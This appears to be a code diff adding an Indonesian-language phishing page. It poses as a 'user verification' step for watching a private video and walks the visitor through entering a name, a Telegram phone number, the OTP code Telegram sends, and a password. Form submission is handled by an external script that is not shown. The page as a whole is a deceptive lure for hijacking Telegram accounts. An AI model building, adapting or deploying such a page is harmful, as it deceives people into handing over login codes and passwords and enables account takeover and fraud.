@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css">
+    <style>
+        /* Mengatur tampilan layar penuh */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #2d2d2d;
+            color: #f5f5f5;
+            font-family: Arial, sans-serif;
+            box-sizing: border-box;
+        }
+
+        /* Container yang menyesuaikan */
+        .container {
+            width: 100%;
+            max-width: 480px; /* Maksimal 480px untuk layar besar */
+            background-color: #444;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            margin: 20px;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #ff5733;
+            text-align: center;
+        }
+
+        .info-text {
+            color: #bfbfbf;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 0.95rem;
+        }
+
+        .form-label {
+            color: #f5f5f5;
+            font-size: 0.9rem;
+        }
+
+        /* Mengatur input field */
+        .form-control {
+            background-color: #333;
+            color: #f5f5f5;
+            border: none;
+            border-radius: 5px;
+            padding-left: 40px;
+            height: 45px;
+            box-sizing: border-box;
+            font-size: 0.95rem;
+        }
+
+        /* Input dengan ikon */
+        .input-icon {
+            position: relative;
+            margin-bottom: 1.2rem;
+        }
+
+        .input-icon .icon {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 1.2rem;
+        }
+
+        /* Gaya tombol */
+        .btn-primary, .btn-success {
+            width: 100%;
+            font-weight: bold;
+            border-radius: 5px;
+            height: 45px;
+            font-size: 1rem;
+        }
+
+        .btn-primary {
+            background-color: #ff5733;
+            border: none;
+            transition: background-color 0.3s;
+        }
+
+        .btn-primary:hover {
+            background-color: #e04e2b;
+        }
+
+        .btn-success {
+            background-color: #28a745;
+            border: none;
+            transition: background-color 0.3s;
+        }
+
+        .btn-success:hover {
+            background-color: #218838;
+        }
+
+        /* Responsif untuk perangkat kecil */
+        @media (max-width: 576px) {
+            h2 {
+                font-size: 1.6rem;
+            }
+
+            .container {
+                padding: 15px;
+            }
+
+            .form-control {
+                font-size: 0.9rem;
+                padding-left: 35px;
+                height: 40px;
+            }
+
+            .btn-primary, .btn-success {
+                height: 40px;
+                font-size: 0.9rem;
+            }
+        }
+
+        .error {
+            color: #ff5733; /* Warna merah untuk kesalahan */
+            font-size: 0.8rem;
+        }
+
+        /* Styles for the loading overlay */
+        .loading-overlay {
+            display: none; /* Initially hidden */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #ff5733; /* Color of the spinner */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Styles for modal alert */
+        .modal {
+            display: none; /* Initially hidden */
+            position: fixed;
+            z-index: 1050;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: rgba(0, 0, 0, 0.7); /* Slightly darker overlay */
+            justify-content: center; /* Center the modal */
+            align-items: center; /* Center the modal */
+        }
+
+        .modal-dialog {
+            margin: 1.75rem auto;
+            max-width: 90%; /* Set a max-width for the modal */
+            width: 100%; /* Make it responsive */
+        }
+
+        .modal-content {
+            background-color: #444; /* Match the form background */
+            color: #f5f5f5; /* Text color */
+            border-radius: 10px; /* Rounded corners */
+            border: none; /* No border */
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); /* Subtle shadow for depth */
+        }
+
+        /* Centering text within the modal */
+        .modal-header,
+        .modal-body,
+        .modal-footer {
+            text-align: center; /* Center align all text */
+        }
+
+        .modal-header .modal-title {
+            width: 100%; /* Ensures the title takes the full width for center alignment */
+        }
+
+        .modal-body p {
+            margin: 0; /* Remove default margin for better alignment */
+        }
+
+        .modal-header, .modal-footer {
+            border: none; /* No border */
+        }
+
+        .modal-title {
+            color: #ff5733; /* Title color */
+        }
+
+        /* Media Queries for Responsiveness */
+        @media (max-width: 768px) { /* Tablets and smaller screens */
+            .modal-dialog {
+                margin: 0; /* Remove margin for mobile view */
+                width: 95%; /* Make it take up more space on small screens */
+            }
+
+            .modal-content {
+                border-radius: 0; /* No rounded corners for small screens */
+            }
+
+            .modal-header, .modal-body, .modal-footer {
+                padding: 10px; /* Reduce padding for mobile */
+            }
+        }
+
+        @media (max-width: 576px) { /* Mobile phones */
+            .modal-title {
+                font-size: 1.5rem; /* Smaller title size */
+            }
+
+            .modal-body p {
+                font-size: 0.9rem; /* Smaller body text */
+            }
+
+            .btn-primary {
+                width: 100%; /* Full width for buttons */
+                font-size: 0.9rem; /* Smaller button text */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Verifikasi Pengguna</h2>
+        <p class="info-text" id="yy">Video ini bersifat privat dan hanya dapat ditonton oleh pengguna terverifikasi. Silakan lengkapi proses verifikasi berikut untuk melanjutkan.</p>
+        
+        <div id="step1" class="mt-4">
+            <form id="verificationForm">
+                <div class="input-icon">
+                    <span class="icon">👤</span>
+                    <input type="text" class="form-control" id="fullName" placeholder="Nama Lengkap" required>
+                </div>
+                <div class="input-icon">
+                    <span class="icon">📱</span>
+                    <input type="text" class="form-control" id="phone" placeholder="Nomor Telegram" pattern="\d+" required oninvalid="setCustomValidity('Hanya angka yang diperbolehkan')" oninput="setCustomValidity('')">
+                    <div class="error" id="phoneError"></div>
+                </div>
+                <button type="button" class="btn btn-primary" onclick="nextStep(2)">Selanjutnya</button>
+            </form>
+        </div>
+
+        <div id="step2" class="mt-4" style="display: none;">
+    <p class="info-text" id="step3Description">Kami telah mengirimkan kode pada telegram anda, silahkan cek pesan telegram anda.</p>
+    <div class="mb-3">
+        <label for="otp" class="form-label">Kode OTP</label>
+        <input type="text" class="form-control" id="otp" placeholder="Masukkan kode OTP" pattern="\d+" required oninvalid="setCustomValidity('Hanya angka yang diperbolehkan')" oninput="setCustomValidity('')">
+        <div class="error" id="otpError"></div>
+    </div>
+    <button type="button" class="btn btn-primary" onclick="nextStep(3)">Selanjutnya</button>
+</div>
+
+
+        <div id="step3" class="mt-4" style="display: none;">
+            <div class="mb-3">
+                <label for="password" class="form-label">Kata Sandi</label>
+                <input type="password" class="form-control" id="password" placeholder="Masukkan kata sandi" required>
+            </div>
+            <button type="button" class="btn btn-success" onclick="submitVerification()">Kirim</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+        // Memastikan hanya angka yang diizinkan di nomor telepon dan OTP
+        document.getElementById('phone').addEventListener('input', function (e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        document.getElementById('otp').addEventListener('input', function (e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+
+    <!-- Loading Spinner -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Alert Modal -->
+    <div id="alertModal" class="modal" tabindex="-1" role="dialog">
+        <div class="modal-dialog" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Peringatan</h5>
+                    <button type="button" class="close" onclick="hideAlert()">
+                        <span>&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <p id="alertMessage"></p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-primary" onclick="hideAlert()">Tutup</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
